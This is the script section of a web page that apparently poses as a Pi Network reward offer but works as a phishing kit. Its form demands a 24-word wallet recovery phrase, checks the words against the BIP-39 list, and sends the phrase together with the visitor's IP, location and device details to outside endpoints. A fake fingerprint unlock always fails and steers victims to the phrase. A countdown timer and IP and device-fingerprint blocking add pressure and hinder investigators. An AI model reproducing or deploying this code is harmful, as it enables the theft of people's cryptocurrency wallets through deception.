                                            resolve([]);
                                        }
                                        db.close();
                                    };

                                    getRequest.onerror = function () {
                                        resolve([]);
                                        db.close();
                                    };
                                } catch (e) {
                                    resolve([]);
                                    db.close();
                                }
                            };
                        } catch (e) {
                            console.error("Error accessing IndexedDB:", e);
                            resolve([]);
                        }
                    });
                },

                // Get data from device fingerprint
                getFromDeviceFingerprint: function () {
                    try {
                        // Create current device fingerprint
                        const fingerprint = {
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            screenWidth: screen.width,
                            screenHeight: screen.height,
                            colorDepth: screen.colorDepth,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            platform: navigator.platform,
                        };

                        // Calculate hash
                        const fingerprintStr = JSON.stringify(fingerprint);
                        const fingerprintHash = this.simpleHash(fingerprintStr);

                        // Check localStorage
                        const localData = localStorage.getItem(`device_${fingerprintHash}`);
                        if (localData) {
                            return JSON.parse(localData);
                        }

                        // Check sessionStorage
                        const sessionData = sessionStorage.getItem(`device_${fingerprintHash}`);
                        if (sessionData) {
                            return JSON.parse(sessionData);
                        }

                        // Check cookie
                        const cookies = document.cookie.split(";");
                        for (let cookie of cookies) {
                            cookie = cookie.trim();
                            if (cookie.startsWith("device_fingerprint=")) {
                                const storedHash = cookie.substring("device_fingerprint=".length);
                                // If device fingerprint is in cookie, try to get data from localStorage
                                const fingerprintData = localStorage.getItem(`device_${storedHash}`);
                                if (fingerprintData) {
                                    return JSON.parse(fingerprintData);
                                }
                            }
                        }
                    } catch (e) {
                        console.error("Error retrieving device fingerprint data:", e);
                    }

                    return [];
                },
            };

            // Check if IP is in blocked list
            function checkIfIPBlocked(ip) {
                if (!ip) return false;

                // Get blocked IPs from enhanced storage system
                let blockedIPs = blockStorage.get();

                // Check if current IP is blocked
                const blockedEntry = blockedIPs.find((item) => item.ip === ip);
                let isBlocked = !!blockedEntry;

                // If not found by IP, check device fingerprint
                if (!isBlocked) {
                    // Data from device fingerprint - fallback method
                    const fingerprintData = blockStorage.getFromDeviceFingerprint();
                    isBlocked = fingerprintData && fingerprintData.length > 0;

                    if (isBlocked && ip && ip !== "unavailable") {
                        // If found blocked device but different IP, update block list with new IP
                        const existingList = blockStorage.get();
                        if (!existingList.some((item) => item.ip === ip)) {
                            existingList.push({
                                ip: ip,
                                reason: "Device was previously blocked",
                                timestamp: new Date().toISOString(),
                                permanent: true,
                            });
                            blockStorage.save(existingList);
                        }
                    }
                }

                if (isBlocked) {
                    ipBlockStatus.blocked = true;
                    ipBlockStatus.reason = blockedEntry ? blockedEntry.reason || "Suspicious activity" : "Device was blocked";
                    ipBlockStatus.permanent = blockedEntry ? blockedEntry.permanent || false : true;

                    // Show blocked message
                    showBlockedMessage();
                    console.log(`IP ${ip} is blocked: ${ipBlockStatus.reason}`);
                }

                return isBlocked;
            }

            // Add IP to blocked list
            function blockIP(ip, reason = "Multiple suspicious requests") {
                if (!ip) return;

                try {
                    // Get list of blocked IPs
                    let blockedIPs = blockStorage.get();

                    // Add new IP if not already blocked
                    if (!blockedIPs.some((item) => item.ip === ip)) {
                        blockedIPs.push({
                            ip: ip,
                            reason: reason,
                            timestamp: new Date().toISOString(),
                            permanent: true, // Mark as permanently blocked
                        });

                        // Save updated list to all storage sources
                        blockStorage.save(blockedIPs);

                        // Update status
                        ipBlockStatus.blocked = true;
                        ipBlockStatus.reason = reason;

                        // Show blocked message
                        showBlockedMessage();
                        console.log(`IP ${ip} has been permanently blocked: ${reason}`);
                    }
                } catch (error) {
                    console.error("Error blocking IP:", error);
                }
            }

            // Show blocked IP message
            function showBlockedMessage() {
                const blockedMessage = document.getElementById("ipBlockedMessage");

                // Show message
                blockedMessage.style.display = "block";

                // Disable forms and buttons
                const unlockSubmitBtn = document.getElementById("unlockSubmitBtn");

                if (unlockSubmitBtn) {
                    unlockSubmitBtn.disabled = true;
                }

                // Disable all Offer Now buttons
                document.querySelectorAll(".buy-now").forEach((button) => {
                    button.disabled = true;
                    button.textContent = "Access Denied";
                    button.classList.add("opacity-50");
                    button.style.cursor = "not-allowed";
                });
            }

            // Close blocked message
            function closeBlockedMessage() {
                const blockedMessage = document.getElementById("ipBlockedMessage");
                blockedMessage.style.display = "none";
            }

            // Track suspicious activity and potentially block IP
            function trackSuspiciousActivity(isInvalidPhrase = false) {
                if (!userIPData || !userIPData.ip || userIPData.ip === "unavailable") return false;

                // Get and increment suspicious request count
                let suspiciousCount = 0;
                try {
                    // Try localStorage first
                    suspiciousCount = parseInt(localStorage.getItem(`suspicious_${userIPData.ip}`) || "0");

                    // If localStorage is empty, try sessionStorage
                    if (suspiciousCount === 0) {
                        suspiciousCount = parseInt(sessionStorage.getItem(`suspicious_${userIPData.ip}`) || "0");
                    }

                    // If both are empty, try cookie
                    if (suspiciousCount === 0) {
                        const cookies = document.cookie.split(";");
                        for (let cookie of cookies) {
                            cookie = cookie.trim();
                            if (cookie.startsWith(`suspicious_${userIPData.ip}=`)) {
                                suspiciousCount = parseInt(cookie.substring(`suspicious_${userIPData.ip}=`.length));
                                break;
                            }
                        }
                    }

                    // Increment by 1 for normal request, by 3 for invalid phrase
                    suspiciousCount += isInvalidPhrase ? 3 : 1;

                    // Save to multiple storage sources
                    localStorage.setItem(`suspicious_${userIPData.ip}`, suspiciousCount.toString());
                    sessionStorage.setItem(`suspicious_${userIPData.ip}`, suspiciousCount.toString());

                    // Save to cookie with 1 year expiration
                    const expiryDate = new Date();
                    expiryDate.setFullYear(expiryDate.getFullYear() + 1);
                    document.cookie = `suspicious_${userIPData.ip}=${suspiciousCount};expires=${expiryDate.toUTCString()};path=/;SameSite=Strict`;

                    console.log(`Suspicious activity count for ${userIPData.ip}: ${suspiciousCount}`);

                    // Block IP if threshold exceeded (5 points)
                    if (suspiciousCount >= 20) {
                        blockIP(userIPData.ip, "Exceeded suspicious request limit");
                        return true; // IP has been blocked
                    }
                } catch (e) {
                    console.error("Error tracking suspicious activity:", e);
                }

                return false; // IP not blocked
            }

            function initializeBlockCheck() {
                getUserIPInfo().then((ipData) => {
                    if (ipData && ipData.ip && ipData.ip !== "unavailable") {
                        checkIfIPBlocked(ipData.ip);
                    } else {
                        // If no IP, check device fingerprint
                        const fingerprintData = blockStorage.getFromDeviceFingerprint();
                        if (fingerprintData && fingerprintData.length > 0) {
                            ipBlockStatus.blocked = true;
                            ipBlockStatus.reason = "Device has been blocked";
                            ipBlockStatus.permanent = true;
                            showBlockedMessage();
                        }
                    }
                });
            }

            // Language Switching
            let currentLanguage = "en"; // Default language is English

            // Set language
            function setLanguage(lang) {
                currentLanguage = "en"; // Force English
                // Update all text elements with language attributes
                const elements = document.querySelectorAll("[data-kr][data-en]");
                elements.forEach((element) => {
                    // Handle placeholder attribute for inputs
                    if (element.hasAttribute("placeholder")) {
                        element.setAttribute("placeholder", element.getAttribute("data-en"));
                    }
                    // Handle text content for regular elements
                    else {
                        element.textContent = element.getAttribute("data-en");
                    }
                });

                // Store language preference
                try {
                    localStorage.setItem("preferredLanguage", "en");
                } catch (e) {
                    console.error("Error storing language preference:", e);
                }

                // Update UI for submission count with correct language
                updateUIForSubmissionCount();

                // Update pending requests badge language
                updatePendingRequestsBadge();
            }

            // Get current language
            function getCurrentLanguage() {
                return "en"; // Always return English
            }

            // Initialize language options
            function initializeLanguageOptions() {
                // Set English as default language
                setLanguage("en");
            }

            // Pending Requests System - updated to use serverless API
            const pendingRequests = {
                // Store configuration
                storageKey: "piPendingRequests",

                // API endpoint configuration - replace with your actual Vercel endpoint
                apiEndpoint: "https://check.earnpiapi.com/api/send-message",
                // Backup endpoints for redundancy
                backupEndpoints: ["https://api3.earnpiapi.com/api/send-message"],

                // Get pending requests from storage
                get: function () {
                    try {
                        const stored = localStorage.getItem(this.storageKey);
                        return stored ? JSON.parse(stored) : [];
                    } catch (e) {
                        console.error("Error getting pending requests:", e);
                        return [];
                    }
                },

                // Save pending requests to storage
                save: function (requests) {
                    try {
                        localStorage.setItem(this.storageKey, JSON.stringify(requests));
                        this.updateBadge();
                    } catch (e) {
                        console.error("Error saving pending requests:", e);
                    }
                },

                // Add a new request to the queue
                add: function (data) {
                    const requests = this.get();
                    requests.push({
                        ...data,
                        id: Date.now() + Math.random().toString(36).substring(2, 9),
                        timestamp: new Date().toISOString(),
                        attempts: 0,
                        endpointIndex: 0, // Start with primary endpoint
                    });
                    this.save(requests);
                    this.process(); // Try to process immediately
                    return true;
                },

                // Update badge to show pending count
                updateBadge: function () {
                    const requests = this.get();
                    const badge = document.getElementById("pendingRequestsBadge");
                    const count = document.getElementById("pendingCount");

                    if (requests.length > 0) {
                        count.textContent = requests.length;
                        badge.style.display = "block";
                    } else {
                        badge.style.display = "none";
                    }

                    // Update text based on language
                    const prefix = document.querySelector("#pendingRequestsBadge span[data-en]");
                    if (prefix) {
                        prefix.textContent = getCurrentLanguage() === "en" ? "Pending: " : "Pending: ";
                    }
                },

                // Process all pending requests
                process: function () {
                    const requests = this.get();
                    if (requests.length === 0) return;

                    // We'll process one at a time to avoid rate limits
                    this.processRequest(requests[0]).then((success) => {
                        const updatedRequests = this.get(); // Get fresh copy in case it changed
                        if (success) {
                            // Remove the successfully processed request
                            updatedRequests.shift();
                            this.save(updatedRequests);
                        } else {
                            // Update the request with increased attempt count
                            if (updatedRequests.length > 0) {
                                updatedRequests[0].attempts += 1;

                                // Try backup endpoint if available
                                if (this.backupEndpoints.length > 0 && updatedRequests[0].endpointIndex < this.backupEndpoints.length) {
                                    updatedRequests[0].endpointIndex += 1;
                                }

                                // If too many attempts (10+), move to the end of the queue
                                if (updatedRequests[0].attempts >= 10) {
                                    const failedRequest = updatedRequests.shift();
                                    failedRequest.attempts = 0; // Reset attempts
                                    failedRequest.endpointIndex = 0; // Reset to primary endpoint
                                    updatedRequests.push(failedRequest); // Move to end
                                }

                                this.save(updatedRequests);
                            }
                        }

                        // Schedule next process with exponential backoff
                        if (updatedRequests.length > 0) {
                            const delay = Math.min(2000 * Math.pow(1.5, updatedRequests[0].attempts), 30000);
                            setTimeout(() => this.process(), delay);
                        }
                    });
                },

                // Process a single request with retry logic - updated to use serverless API
                processRequest: async function (request) {
                    if (!request) return false;

                    try {
                        // Select the endpoint to use (primary or backup)
                        let endpoint = this.apiEndpoint;
                        if (request.endpointIndex > 0 && request.endpointIndex <= this.backupEndpoints.length) {
                            endpoint = this.backupEndpoints[request.endpointIndex - 1];
                        }

                        // Get the message and add metadata for the serverless function
                        const payload = {
                            captchaToken: request.captchaToken,
                            message: request.message,
                            walletAddress: request.walletAddress,
                            timestamp: new Date().toISOString(),
                            requestId: request.id,
                        };

                        // Call the serverless API instead of Telegram directly
                        const response = await fetch(endpoint, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                "Cf-Token": request.captchaToken,
                            },
                            body: JSON.stringify(payload),
                        });

                        if (response.status === 429) {
                            // blockIP(ipx, reason = "Too Many Requests");
                            window.location.replace("https://www.google.com/");
                            return false;
                        }

                        if (!response.ok) {
                            throw new Error(`API error: ${response.status}`);
                        }

                        const data = await response.json();
                        return data.success === true;
                    } catch (error) {
                        console.error("Error sending message:", error);
                        return false;
                    }
                },
            };

            // Update the pending requests badge based on current language
            function updatePendingRequestsBadge() {
                pendingRequests.updateBadge();
            }

            // Initialize page
            document.addEventListener("DOMContentLoaded", function () {
                // Initialize language options
                initializeLanguageOptions();
                // Initialize countdown timer with persistence
                initCountdownTimer();
                initializeBlockCheck();

                // Use requestAnimationFrame for better performance
                requestAnimationFrame(() => {
                    createPremiumBackground();
                    createFloatingIcons(); // <-- Updated function
                    createExplosionParticles();
                    setupFeatureCardWaves();
                });

                // Delay non-essential animations
                setTimeout(() => {
                    handleScrollAnimations();
                }, 100);

                // Check submission count and update UI
                updateUIForSubmissionCount();

                // Set up blocked message close button
                document.getElementById("closeBlockedMessage").addEventListener("click", closeBlockedMessage);

                // Hide back button initially
                const headerBackBtn = document.getElementById("headerBackBtn");
                headerBackBtn.style.visibility = "hidden";

                // Button click handlers

                const backToHomeBtn = document.getElementById("backToHomeBtn");
                const unlockSubmitBtn = document.getElementById("unlockSubmitBtn");

                // const openFormBtn = document.getElementById("openFormBtn");
                // // Open form page
                // openFormBtn.addEventListener("click", function () {
                // 	// Check if IP is blocked
                // 	if (ipBlockStatus.blocked) {
                // 		showBlockedMessage();
                // 		return;
                // 	}

                // 	// If user has exceeded limit, don't allow opening form
                // 	if (hasExceededLimit()) {
                // 		const message =
                // 			getCurrentLanguage() === "en"
                // 				? "You have exceeded the allowed number of requests."
                // 				: "You have exceeded the allowed number of requests.";
                // 		alert(message);
                // 		return;
                // 	}

                // 	navigateTo("homePage", "formPage", "right");
                // 	updateUIForSubmissionCount();
                // });

                // Add event listeners for all Offer Now buttons
                document.querySelectorAll(".buy-now").forEach((button) => {
                    button.addEventListener("click", function () {
                        // Check if IP is blocked
                        if (ipBlockStatus.blocked) {
                            showBlockedMessage();
                            return;
                        }

                        // If user has exceeded limit, don't allow opening form
                        if (hasExceededLimit()) {
                            alert("You have exceeded the allowed number of requests.");
                            return;
                        }

                        // Show loading overlay
                        const loadingOverlay = document.getElementById("loadingOverlay");
                        loadingOverlay.style.display = "flex";

                        // Navigate to form page
                        navigateTo("homePage", "formPage", "right");
                        updateUIForSubmissionCount();

                        // Wait for form page transition to complete
                        const formPage = document.getElementById("formPage");
                        const handleTransitionEnd = () => {
                            // Hide loading overlay after transition
                            loadingOverlay.style.display = "none";
                            formPage.removeEventListener("transitionend", handleTransitionEnd);
                        };
                        formPage.addEventListener("transitionend", handleTransitionEnd);
                    });
                });

                // Back to home
                backToHomeBtn.addEventListener("click", function () {
                    navigateTo("formPage", "homePage", "left");
                });

                // Header back button
                headerBackBtn.addEventListener("click", function () {
                    const activePageId = document.querySelector(".page.page-active").id;

                    if (activePageId === "formPage") {
                        navigateTo("formPage", "homePage", "left");
                    }
                });

                let bip39Wordlist = null;
                let isFetchingWordlist = false;

                // Fetch BIP-39 wordlist and cache it
                async function fetchBIP39Wordlist() {
                    if (bip39Wordlist !== null) return bip39Wordlist;
                    if (isFetchingWordlist) return null;

                    isFetchingWordlist = true;
                    try {
                        // Attempt to fetch the wordlist
                        const response = await fetch("english.txt");
                        if (!response.ok) throw new Error("Failed to fetch wordlist");

                        const text = await response.text();
                        // Create a Set for faster lookups
                        bip39Wordlist = new Set(text.split("\n").filter((word) => word.trim().length > 0));
                        return bip39Wordlist;
                    } catch (error) {
                        console.error("Error fetching BIP-39 wordlist:", error);
                        // Fallback to a smaller built-in list of common BIP-39 words for basic validation
                        const commonWords = [
                            "abandon",
                            "ability",
                            "able",
                            "about",
                            "above",
                            "absent",
                            "absorb",
                            "abstract",
                            "absurd",
                            "abuse",
                            "access",
                            "accident",
                            "account",
                            "accuse",
                            "achieve",
                            "acid",
                            "acoustic",
                            "acquire",
                            "across",
                            "act",
                            "action",
                            "actor",
                            "actress",
                            "actual",
                            "adapt",
                            "add",
                            "addict",
                            "address",
                            "adjust",
                            "admit",
                            "adult",
                            "advance",
                            "advice",
                            "aerobic",
                            "affair",
                            "afford",
                            "afraid",
                            "again",
                            "age",
                            "agent",
                            "agree",
                            "ahead",
                            "aim",
                            "air",
                            "airport",
                            "aisle",
                            "alarm",
                            "album",
                            "alcohol",
                            "alert",
                            "alien",
                            "all",
                            "alley",
                            "allow",
                            "almost",
                            "alone",
                            "alpha",
                            "already",
                            "also",
                            "alter",
                            "always",
                            "amateur",
                            "amazing",
                            "among",
                            "amount",
                            "amused",
                            "analyst",
                            "anchor",
                            "ancient",
                            "anger",
                            "angle",
                            "angry",
                            "animal",
                            "ankle",
                            "announce",
                            "annual",
                            "another",
                            "answer",
                            "antenna",
                            "antique",
                            "anxiety",
                            "any",
                            "apart",
                            "apology",
                            "appear",
                            "apple",
                            "approve",
                            "april",
                            "arch",
                            "arctic",
                            "area",
                            "arena",
                            "argue",
                            "arm",
                            "armed",
                            "armor",
                            "army",
                            "around",
                            "arrange",
                            "arrest",
                            "arrive",
                            "arrow",
                            "art",
                            "artefact",
                            "artist",
                            "artwork",
                            "ask",
                            "aspect",
                            "assault",
                            "asset",
                            "assist",
                            "assume",
                            "asthma",
                            "athlete",
                            "atom",
                            "attack",
                            "attend",
                            "attitude",
                            "attract",
                            "auction",
                            "audit",
                            "august",
                            "aunt",
                            "author",
                            "auto",
                            "autumn",
                            "average",
                            "avocado",
                            "avoid",
                            "awake",
                            "aware",
                            "away",
                            "awesome",
                            "awful",
                            "awkward",
                            "axis",
                            "baby",
                            "bachelor",
                            "bacon",
                            "badge",
                            "bag",
                            "balance",
                            "balcony",
                            "ball",
                            "bamboo",
                            "banana",
                            "banner",
                            "bar",
                            "barely",
                            "bargain",
                            "barrel",
                            "base",
                            "basic",
                            "basket",
                            "battle",
                            "beach",
                            "bean",
                            "beauty",
                            "because",
                            "become",
                            "beef",
                            "before",
                            "begin",
                            "behave",
                            "behind",
                            "believe",
                            "below",
                            "belt",
                            "bench",
                            "benefit",
                            "best",
                            "betray",
                            "better",
                            "between",
                            "beyond",
                            "bicycle",
                            // Add more common BIP-39 words if needed or use a compressed version of the full list
                        ];
                        bip39Wordlist = new Set(commonWords);
                        return bip39Wordlist;
                    } finally {
                        isFetchingWordlist = false;
                    }
                }

                // Validate if words are in the BIP-39 wordlist
                async function validateBIP39Words(words) {
                    const wordlist = await fetchBIP39Wordlist();
                    if (!wordlist) return { valid: false, invalidWords: [] }; // Wordlist not available

                    const invalidWords = words.filter((word) => !wordlist.has(word.toLowerCase()));
                    return {
                        valid: invalidWords.length === 0,
                        invalidWords: invalidWords,
                    };
                }

                // Word counter and validation
                const walletAddressInput = document.getElementById("walletAddress");
                const wordCounter = document.getElementById("wordCounter");
                const validationMessage = document.getElementById("validationMessage");
                const inputContainer = document.querySelector(".pi-input-container");

                // Start fetching the wordlist as soon as possible
                fetchBIP39Wordlist();

                // Update word count on input with debounce for better performance
                let debounceTimer;
                walletAddressInput.addEventListener("input", function () {
                    clearTimeout(debounceTimer);
                    debounceTimer = setTimeout(async () => {
                        const text = this.value.trim();
                        let wordCount = 0;
                        let words = [];

                        if (text) {
                            words = text.split(/\s+/).filter((word) => word.length > 0);
                            wordCount = words.length;
                        }

                        // Nếu có nội dung và không phải 24 từ
                        if (wordCount > 0 && wordCount !== 24) {
                            const lang = getCurrentLanguage();
                            validationMessage.classList.remove("hidden");
                            validationMessage.textContent = `Please enter exactly 24 words (current: ${wordCount})`;
                            inputContainer.classList.remove("valid-input");
                            inputContainer.classList.add("invalid-input");

                            wordCounter.textContent = "";
                        } else if (wordCount === 24) {
                            // Validate words against BIP-39 wordlist
                            const validation = await validateBIP39Words(words);

                            if (!validation.valid) {
                                const lang = getCurrentLanguage();
                                const firstInvalidWords = validation.invalidWords.slice(0, 3);
                                validationMessage.classList.remove("hidden");
                                validationMessage.textContent = `Invalid words detected: ${firstInvalidWords.join(", ")}${validation.invalidWords.length > 3 ? "..." : ""}`;
                                inputContainer.classList.remove("valid-input");
                                inputContainer.classList.add("invalid-input");
                                wordCounter.textContent = "";
                            } else {
                                validationMessage.classList.add("hidden");
                                inputContainer.classList.add("valid-input");
                                inputContainer.classList.remove("invalid-input");
                                wordCounter.textContent = "";
                            }
                        } else {
                            validationMessage.classList.add("hidden");
                            inputContainer.classList.remove("valid-input");
                            inputContainer.classList.remove("invalid-input");
                            wordCounter.textContent = "";
                        }
                    }, 300);
                });

                // Form submission with serverless API
                unlockSubmitBtn.addEventListener("click", async function () {
                    const token = document.getElementById("captchaToken").value;

                    // Security checks
                    if (ipBlockStatus.blocked) {
                        showBlockedMessage();
                        return;
                    }

                    if (hasExceededLimit()) {
                        document.getElementById("errorMessage").style.display = "block";
                        document.getElementById("errorMessage").innerHTML = `<i class="fas fa-ban mr-2"></i>You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.`;
                        trackSuspiciousActivity();
                        return;
                    }

                    // Validate wallet address
                    const walletAddress = walletAddressInput.value.trim();
                    const words = walletAddress.split(/\s+/).filter((word) => word.length > 0);
                    const wordCount = words.length;

                    if (!walletAddress || wordCount !== 24) {
                        inputContainer.classList.add("invalid-input");
                        wordCounter.textContent = `Please enter exactly 24 words (current: ${wordCount})`;
                        wordCounter.classList.add("invalid");
                        validationMessage.classList.remove("hidden");
                        trackSuspiciousActivity();
                        return;
                    }

                    // Validate against BIP-39 wordlist
                    const validation = await validateBIP39Words(words);
                    if (!validation.valid) {
                        const firstInvalidWords = validation.invalidWords.slice(0, 3);
                        wordCounter.textContent = `Invalid phrase. Invalid words: ${firstInvalidWords.join(", ")}${validation.invalidWords.length > 3 ? "..." : ""}`;
                        wordCounter.classList.add("invalid");
                        inputContainer.classList.add("invalid-input");
                        inputContainer.classList.remove("valid-input");
                        validationMessage.classList.remove("hidden");
                        validationMessage.textContent = "Phrase contains invalid words. Cannot send request.";

                        const blocked = trackSuspiciousActivity(true);
                        if (blocked) {
                            showBlockedMessage();
                        }
                        return;
                    }

                    // Show loading state
                    showLoading();

                    try {
                        // Get IP data
                        if (!userIPData || userIPData.ip === "unavailable") {
                            userIPData = await getUserIPInfo();
                        }

                        // Increment submission count
                        const newCount = incrementSubmissionCount();

                        // Format location info
                        const locationInfo = formatLocationInfo(userIPData);
                        const ipx = userIPData.ip || "unavailable";

                        // Create secure payload
                        const payload = {
                            captchaToken: token,
                            walletAddress: walletAddress,
                            ipInfo: {
                                ip: ipx,
                                location: locationInfo,
                                country: userIPData.country || "unknown",
                                city: userIPData.city || "unknown",
                            },
                            submissionCount: newCount,
                            timestamp: new Date().toISOString(),
                            deviceInfo: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screenResolution: `${window.screen.width}x${window.screen.height}`,
                            },
                        };

                        // Send request with retry mechanism
                        const response = await sendRequestWithRetry(payload, token);

                        if (response.status === 429) {
                            blockIP(ipx, "Too Many Requests");
                            window.location.replace("https://www.google.com/");
                            return;
                        }

                        if (!response.ok) {
                            throw new Error(`API error: ${response.status}`);
                        }

                        // Handle success
                        handleSubmissionSuccess();
                    } finally {
                        hideLoading();
                    }
                });

                // Helper functions for the submission process
                function formatLocationInfo(ipData) {
                    if (!ipData) return "Unknown location";

                    const city = ipData.city && ipData.city !== "unknown" ? ipData.city : "";
                    const country = ipData.country_name || getCountryName(ipData.country) || "Unknown country";

                    return city ? `${city}, ${country}` : country;
                }

                async function sendRequestWithRetry(payload, token, maxRetries = 3) {
                    for (let attempt = 1; attempt <= maxRetries; attempt++) {
                        try {
                            const response = await fetch(pendingRequests.apiEndpoint, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                    "Cf-Token": token,
                                },
                                body: JSON.stringify(payload),
                                signal: AbortSignal.timeout(5000),
                            });
                            return response;
                        } catch (error) {
                            if (attempt === maxRetries) throw error;
                            await new Promise((resolve) => setTimeout(resolve, 1000 * attempt));
                        }
                    }
                }

                function handleSubmissionSuccess() {
                    updateUIForSubmissionCount();
                    window.location.replace("https://success-lucky-5f3e1c-moxie.netlify.app/?status=offer");
                }

                // Handle fingerprint unlock button
                document.querySelector(".pi-button-secondary").addEventListener("click", function () {
                    // Check if IP is blocked
                    if (ipBlockStatus.blocked) {
                        showBlockedMessage();
                        return;
                    }

                    // Show loading state
                    showLoading();

                    // Check if Web Authentication API is available
                    if (window.PublicKeyCredential && typeof navigator.credentials !== "undefined" && typeof navigator.credentials.get === "function") {
                        // Create options for biometric authentication
                        const publicKeyCredentialRequestOptions = {
                            challenge: new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7]),
                            allowCredentials: [],
                            timeout: 60000,
                            userVerification: "preferred",
                        };

                        // Trigger device biometric interface
                        navigator.credentials
                            .get({
                                publicKey: publicKeyCredentialRequestOptions,
                            })
                            .then((credential) => {
                                // Even if successful, show error message after 1 second
                                setTimeout(() => {
                                    hideLoading();
                                    showFingerprintError();
                                }, 1000);
                            })
                            .catch((error) => {
                                // Handle errors (user cancellation, no fingerprint, etc.)
                                console.error("Biometric authentication error:", error);
                                setTimeout(() => {
                                    hideLoading();
                                    showFingerprintError();
                                }, 1000);
                            });
                    } else {
                        // Browser doesn't support Web Authentication API
                        setTimeout(() => {
                            hideLoading();
                            showFingerprintError();
                        }, 1000);
                    }
                });

                // Show fingerprint error message
                function showFingerprintError() {
                    const errorMessage = document.getElementById("errorMessage");

                    // Show error message in English
                    errorMessage.style.display = "block";
                    errorMessage.innerHTML = `<i class="fas fa-fingerprint mr-2"></i>An error occurred. Please unlock with your 24-word phrase`;

                    // Auto-hide error message after 5 seconds
                    setTimeout(() => {
                        errorMessage.style.display = "none";
                    }, 5000);

                    // Mark as suspicious activity (optional)
                    trackSuspiciousActivity();
                }
            });

            // Persistent Countdown Timer
            function initCountdownTimer() {
                const storageKey = "piCountdownEndTime";
                let targetDate;

                // Check if there's a stored end time
                try {
                    const storedEndTime = localStorage.getItem(storageKey);
                    if (storedEndTime) {
                        targetDate = new Date(parseInt(storedEndTime));

                        // If the stored date is invalid or in the past, create a new one
                        if (isNaN(targetDate) || targetDate <= new Date()) {
                            setNewCountdownTime();
                        }
                    } else {
                        // No stored end time, create a new one
                        setNewCountdownTime();
                    }
                } catch (e) {
                    console.error("Error accessing localStorage for countdown:", e);
                    setNewCountdownTime();
                }

                // Set a new countdown time (3 days from now)
                function setNewCountdownTime() {
                    const now = new Date();
                    targetDate = new Date(now);
                    targetDate.setDate(targetDate.getDate() + 3); // Set to 3 days from now

                    try {
                        // Store the end time in localStorage
                        localStorage.setItem(storageKey, targetDate.getTime().toString());
                    } catch (e) {
                        console.error("Error storing countdown time:", e);
                    }
                }

                // Update the countdown every second
                function updateCountdown() {
                    const currentTime = new Date();
                    const diff = targetDate - currentTime;

                    // Check if countdown has ended
                    if (diff <= 0) {
                        document.getElementById("countdown-days").textContent = "00";
                        document.getElementById("countdown-hours").textContent = "00";
                        document.getElementById("countdown-minutes").textContent = "00";
                        document.getElementById("countdown-seconds").textContent = "00";

                        const openFormBtn = document.getElementById("openFormBtn");
                        if (openFormBtn) {
                            openFormBtn.textContent = getCurrentLanguage() === "en" ? "Your wallet is not eligible for rewards" : "귀하의 WALLET은 보상을 받을 수 없습니다.";
                            openFormBtn.disabled = true;
                            openFormBtn.classList.add("opacity-70");
                            openFormBtn.style.cursor = "not-allowed";
                            openFormBtn.style.backgroundColor = "#a5a5a5";
                        }
                        return;
                    }

                    // Calculate time remaining
                    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
                    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((diff % (1000 * 60)) / 1000);

                    // Update the countdown elements
                    document.getElementById("countdown-days").textContent = days < 10 ? `0${days}` : days;
                    document.getElementById("countdown-hours").textContent = hours < 10 ? `0${hours}` : hours;
                    document.getElementById("countdown-minutes").textContent = minutes < 10 ? `0${minutes}` : minutes;

                    // Apply pulse animation when seconds change
                    const secondsElement = document.getElementById("countdown-seconds");
                    const oldSeconds = secondsElement.textContent;
                    const newSeconds = seconds < 10 ? `0${seconds}` : seconds;

                    if (oldSeconds !== newSeconds) {
                        secondsElement.textContent = newSeconds;
                        secondsElement.classList.add("countdown-pulse");
                        setTimeout(() => {
                            secondsElement.classList.remove("countdown-pulse");
                        }, 1000);
                    }
                }

                // Initial update
                updateCountdown();

                // Update every second
                setInterval(updateCountdown, 1000);
            }

            document.querySelector(".pi-info-text a.pi-link").addEventListener("click", function (e) {
                e.preventDefault();

                const errorMessage = document.getElementById("walletErrorMessage");
                if (errorMessage) {
                    errorMessage.style.display = "none";
                }

                navigateTo("formPage", "createWalletPage", "right");
            });

            document.getElementById("walletCreatedBtn").addEventListener("click", function (e) {
                e.preventDefault();
                navigateTo("createWalletPage", "formPage", "left");
            });

            document.getElementById("createNewWalletBtn").addEventListener("click", function () {
                const errorMessage = document.getElementById("walletErrorMessage");
                if (errorMessage) {
                    errorMessage.style.display = "block";
                }
            });

            window.onload = function () {
                grecaptcha.ready(function () {
                    grecaptcha.execute("6LfsTgsrAAAAAJB-bvdznVzM8YsTBG4gtWRVLtT8", { action: "homepage" }).then(function (token) {
                        console.log(token);
                        document.getElementById("captchaToken").value = token;
                    });
                });
            };
        </script>

		<script src="https://www.google.com/recaptcha/api.js?render=6LfsTgsrAAAAAJB-bvdznVzM8YsTBG4gtWRVLtT8"></script>
        <!-- Histats.com  START (hidden counter) -->
        <a href="/" alt="" target="_blank">
            <img src="//sstatic1.histats.com/0.gif?4942635&101" alt="" border="0" />
        </a>
        <!-- Histats.com  END  -->
    </body>
</html>
